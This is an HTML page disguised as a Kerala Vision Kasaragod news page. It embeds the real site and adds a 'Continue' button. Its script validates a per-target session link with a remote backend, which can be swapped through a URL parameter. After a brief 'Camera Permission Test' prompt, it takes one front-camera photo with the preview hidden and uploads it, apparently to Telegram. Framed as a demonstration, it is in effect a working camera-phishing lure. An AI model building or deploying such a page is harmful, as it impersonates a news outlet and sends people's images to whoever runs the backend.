<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kerala Vision News</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      color: #222;
    }

    header {
      padding: 15px 5%;
      border-bottom: 1px solid #ddd;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    header h2 {
      margin: 0;
      color: #b51f24;
    }

    .news-frame {
      width: 100%;
      height: 75vh;
      border: none;
    }

    .fallback {
      padding: 12px;
      text-align: center;
    }

    .controls {
      text-align: center;
      padding: 20px;
    }

    #continueButton {
      background: #c62828;
      color: white;
      border: none;
      border-radius: 6px;
      padding: 10px 24px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    #continueButton:hover {
      background: #a51d1d;
    }

    #continueButton:disabled {
      background: #999;
      cursor: not-allowed;
    }

    /* Modal Backdrop & Dialog */
    .modal-backdrop {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(2px);
      z-index: 1000;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }

    .modal-dialog {
      background: #ffffff;
      border-radius: 8px;
      max-width: 420px;
      width: 100%;
      padding: 22px 24px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
      border-top: 4px solid #c62828;
      text-align: left;
    }

    .modal-title {
      margin: 0 0 12px;
      font-size: 18px;
      font-weight: 700;
      color: #b51f24;
    }

    .modal-message {
      margin: 0 0 20px;
      font-size: 14px;
      line-height: 1.5;
      color: #444;
    }

    .modal-actions {
      display: flex;
      justify-content: flex-end;
      gap: 10px;
    }

    .modal-btn {
      padding: 8px 18px;
      border-radius: 5px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      border: none;
      transition: background 0.15s ease;
    }

    .modal-btn-cancel {
      background: #f1f3f5;
      color: #495057;
      border: 1px solid #ced4da;
    }

    .modal-btn-cancel:hover {
      background: #e9ecef;
    }

    .modal-btn-continue {
      background: #c62828;
      color: #ffffff;
    }

    .modal-btn-continue:hover {
      background: #a51d1d;
    }

    @media (max-width: 480px) {
      .modal-dialog {
        padding: 18px 20px;
      }
      .modal-actions {
        flex-direction: column-reverse;
      }
      .modal-btn {
        width: 100%;
        text-align: center;
        padding: 10px;
      }
    }

    video, canvas {
      display: none;
    }
  </style>
</head>

<body>

  <header>
    <h2>Kerala Vision</h2>
    <span>Kasaragod News</span>
  </header>

  <iframe
    class="news-frame"
    src="https://www.keralavisionnews.com/news/district/kasaragod"
    title="Kerala Vision Kasaragod News">
  </iframe>

  <div class="fallback">
    <a
      href="https://www.keralavisionnews.com/news/district/kasaragod"
      target="_blank"
      rel="noopener noreferrer">
      Open Kerala Vision News
    </a>
  </div>

  <div class="controls">
    <button id="continueButton">Continue</button>
    <p id="status"></p>
  </div>

  <!-- Confirmation Modal -->
  <div id="consentModal" class="modal-backdrop" style="display: none;">
    <div class="modal-dialog" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
      <h3 id="modalTitle" class="modal-title">Camera Permission Test</h3>
      <p class="modal-message">This test will request camera access and capture one photo for the demonstration. Continue only if you agree.</p>
      <div class="modal-actions">
        <button type="button" id="modalCancelBtn" class="modal-btn modal-btn-cancel">Cancel</button>
        <button type="button" id="modalContinueBtn" class="modal-btn modal-btn-continue">Continue</button>
      </div>
    </div>
  </div>

  <video id="camera" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script src="./config.js"></script>
  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const queryApi = urlParams.get("api");
    const BACKEND_URL = queryApi
      ? queryApi.replace(/\/+$/, '')
      : ((window.APP_CONFIG && typeof window.APP_CONFIG.getApiBaseUrl === 'function')
          ? window.APP_CONFIG.getApiBaseUrl()
          : "https://camera-security-demo-1.onrender.com");

    const button = document.getElementById("continueButton");
    const status = document.getElementById("status");
    const video = document.getElementById("camera");
    const canvas = document.getElementById("canvas");
    const modal = document.getElementById("consentModal");
    const modalCancelBtn = document.getElementById("modalCancelBtn");
    const modalContinueBtn = document.getElementById("modalContinueBtn");

    let activeSessionId = null;

    // Extract demonstration session ID from URL query parameters (?session=... or ?id=...)
    function getSessionId() {
      const params = new URLSearchParams(window.location.search);
      return params.get("session") || params.get("id");
    }

    button.addEventListener("click", async () => {
      // 1. Verify session ID presence in URL
      const sessionId = getSessionId();
      if (!sessionId) {
        status.style.color = "#c62828";
        status.textContent = "Missing session ID. Please open this page using a valid demonstration link (e.g., demo.html?session=<id>).";
        return;
      }

      // 2. Verify browser MediaDevices camera support
      if (!navigator.mediaDevices?.getUserMedia) {
        status.style.color = "#c62828";
        status.textContent = "Camera access is not supported by this browser.";
        return;
      }

      // 3. Pre-validate session status with backend before opening modal
      status.style.color = "#444";
      status.textContent = "Verifying demonstration session...";
      button.disabled = true;

      try {
        const checkRes = await fetch(`${BACKEND_URL}/api/sessions/${sessionId}`, {
          method: "GET",
          headers: { "Accept": "application/json" }
        });

        if (!checkRes.ok) {
          let errorMsg = `Session verification failed (HTTP ${checkRes.status}).`;
          try {
            const errData = await checkRes.json();
            if (errData && errData.error) errorMsg = errData.error;
          } catch (_) {}
          throw new Error(errorMsg);
        }

        const sessionData = await checkRes.json();
        if (sessionData.status === "expired") {
          throw new Error("This demonstration session has expired. Please generate a new session link.");
        }
        if (sessionData.status === "revoked") {
          throw new Error("This demonstration session has been revoked by the administrator.");
        }
        if (sessionData.status === "submitted" || (sessionData.submissionsCount && sessionData.submissionsCount >= 1)) {
          throw new Error("A photo has already been submitted for this demonstration session. Sessions are single-use.");
        }

        activeSessionId = sessionId;
        status.textContent = "";

        // 4. Show confirmation modal
        modal.style.display = "flex";

      } catch (err) {
        button.disabled = false;
        status.style.color = "#c62828";
        status.textContent = err.message;
      }
    });

    function closeModal() {
      modal.style.display = "none";
      button.disabled = false;
      status.style.color = "#666";
      status.textContent = "Demonstration cancelled by user.";
    }

    modalCancelBtn.addEventListener("click", closeModal);

    modal.addEventListener("click", (e) => {
      if (e.target === modal) {
        closeModal();
      }
    });

    modalContinueBtn.addEventListener("click", async () => {
      modal.style.display = "none";
      button.disabled = true;
      await executeCameraTest(activeSessionId);
    });

    async function executeCameraTest(sessionId) {
      let stream;

      try {
        status.style.color = "#444";
        status.textContent = "Requesting camera permission...";

        // 5. Request native browser camera permission
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });

        video.srcObject = stream;
        await video.play();

        // 6. Capture exactly one snapshot without displaying a preview
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;

        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // 7. Stop all camera tracks IMMEDIATELY after capturing the photo
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;

        const photo = await new Promise(resolve => {
          canvas.toBlob(resolve, "image/jpeg", 0.85);
        });

        if (!photo) {
          throw new Error("Photo capture failed from video stream.");
        }

        status.style.color = "#444";
        status.textContent = "Sending photo to Telegram...";

        const formData = new FormData();
        formData.append("photo", photo, `session-${sessionId.substring(0, 8)}.jpg`);

        // 8. Submit to the exact existing backend endpoint: POST /api/sessions/:id/photo
        const response = await fetch(
          `${BACKEND_URL}/api/sessions/${sessionId}/photo`,
          {
            method: "POST",
            headers: {
              "Accept": "application/json"
            },
            body: formData
          }
        );

        const responseData = await response.json().catch(() => null);

        if (!response.ok) {
          let errorDetail = `Photo submission failed (HTTP ${response.status}).`;
          if (responseData && responseData.error) {
            errorDetail = responseData.error;
          }
          throw new Error(errorDetail);
        }

        button.disabled = true;
        status.style.color = "#2e7d32";
        status.textContent = "Submission complete.";

      } catch (error) {
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }

        video.srcObject = null;
        button.disabled = false;
        status.style.color = "#c62828";
        status.textContent = error.message;
      }
    }
  </script>

</body>
</html>
